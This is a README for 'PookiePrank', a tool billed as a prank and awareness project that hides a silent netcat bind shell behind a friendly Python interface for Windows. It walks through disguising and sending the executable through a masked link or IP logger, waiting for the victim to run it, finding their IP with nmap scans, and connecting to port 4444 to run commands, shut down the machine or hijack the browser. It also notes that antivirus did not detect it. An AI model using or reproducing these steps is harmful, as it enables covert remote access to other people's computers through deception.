# PookiePrank: A Cute but Terrifying Cybersecurity Awareness Tool 💀🎀


**PLEASE READ THE FULL DOCUMENTATION TO FULLY UNDERSTAND THE PROJECT AND HOW TO MAKE IT ACTUALLY WORK.**
---

## Table of Contents
- [What Is This?](#what-is-this)
- [Features](#features)
- [Why?](#why)
- [Usage](#usage)
- [Responsible Pranking Guidelines](#responsible-pranking-guidelines)
- [Legal Disclaimer](#legal-disclaimer)
- [Future Plans](#future-plans)

## What Is This?

**PookiePrank** is a lightweight "educational" program designed to demonstrate the importance of digital awareness through *strategic chaos*.  
It's a prank tool wrapped in charm — **cute on the outside, spooky on the inside**.

- Uses `netcat` for remote shell access (with full user control)
- Disguised behind a friendly-looking Python CLI
- An educational project that puts a Windows OS to vulnerability (and attacks eventually if not taken care of).
- Perfect for ethical demos, cybersecurity training, and… *light mischief*.

---

## Features

- **Silent Netcat Backdoor:** Triggers a reverse shell silently via batch file.
- **User Distraction UI:** Friendly messages and fake interactions to lower suspicion.
- **Remote Payload Execution:** Once connected, send commands in real-time.
- **Prank Arsenal:** Shutdowns, message popups, browser hijacks, and more.
- **Educational Angle:** Reinforces the dangers of blind trust in random executables.

---

## Why?

Because **security through trauma** works.  
This tool is designed to:

- Raise awareness of how easily social engineering works.
- Show how reverse shells operate.
- Make friends laugh *and* cry.
- Be a conversation starter in any cybersecurity interview.

---

## Usage

1. Host the executable and `netcat` folder.
2. Send the masked download link using a shortened IP logger service or you can perform an `nmap` scan over the network.
3. Wait for the target to run the file.
4. Connect to the shell:
- **On target machine (Runs automatically with python script i.e. `main.py`)**.
   ```bash
   nc64 -lvp 4444
   ```
   
- **Attacker's Machine**.
  - **For Linux**
    ```bash
    nc <ip_address_of_the_target_machine> 4444
    ```
  
  - **For Windows**
    ```bash
    nc64 <ip_address_of_the_target_machine> 4444
    ```
    
   - Windows users can download `netcat` tool from [this repository](https://github.com/int0x33/nc.exe/)
   - In Linux, the netcat comes preinstalled.
   - here by `4444` we mean the port on which we are creating the backdoor. and its `4444` in our case. If required, port number can be changed in the `backdoor.bat` file accordingly.
 
   ---

   **NOTE:**
   
   - You will need to know the target ip address beforehand. You can either use IP Loggers or do an `nmap` scan over the local network using the network id which can be obtained by the subnet mask and the ip address of your device.
   
   - If you are on a virtual machine, it is recommended to perform an `nmap` scan on your host machine since virtual machine results are not accurate.
   
   - **For Windows in Zenmap**
     ```bash
     nmap -sn <network_address_in_cidr_format>
     ```
     
   - **For Linux**
     ```bash
     nmap -sn <network_address_in_cidr_format>
     ```
     
   - For Example:

     If your IP is `192.168.10.247` and subnet is `255.255.255.0`, then your network CIDR is `192.168.10.0/24`

  
   This will list all the IP addresses in a network and we have to find our target from this. We can use the hit and trial method here by using the netcat command.
   

  If port 4444 is open on any IP address, and the netcat command is successful, you're in.



6. Enjoy responsibly (or face karmic doom).
  ---

## Important Note
> ⚠️ Antivirus Note:
This project may be flagged by antivirus software due to its reverse shell functionality.
However, during testing, no detection occurred on our system.
Detection results can vary based on the antivirus engine, configuration, and updates.

---

## Responsible Pranking Guidelines

1. No persistence (no startup or registry hacks).

2. No firewall tampering.

3. No data theft or spying.

4. Always reveal the prank eventually.

5. Use only on friends who won't yeet you into oblivion.



---

## Legal Disclaimer

**This project is for educational and ethical use only.
The creator takes no responsibility for misuse or unforeseen Rickroll (or any) damage caused by the same.**


---

## Future Plans

1. Add GUI launcher with meme themes

2. Auto-cancel prank if user types a secret code

3. PookieSec Dashboard™ for multi-prank coordination

4. Add dancing ASCII Rick in the terminal



## One Last Thing...

> **IMPORTANT:** For this prank to work, **you and your target must be on the same network** (e.g., college Wi-Fi, LAN party, cursed hostel internet).  

> Netcat operates over **local IP addresses** unless you're routing through public ports with port forwarding — which we’re *not doing here* (because jail is not part of the prank).

> ⚠️ Antivirus Note:
This project may be flagged by antivirus software due to its reverse shell functionality.
However, during testing, no detection occurred on our system.
Detection results can vary based on the antivirus engine, configuration, and updates.

So yeah — **same Wi-Fi = RickRoll access granted**.

Stay stealthy, stay sassy. 😎🎀

— *PookieSec Ops Out.*
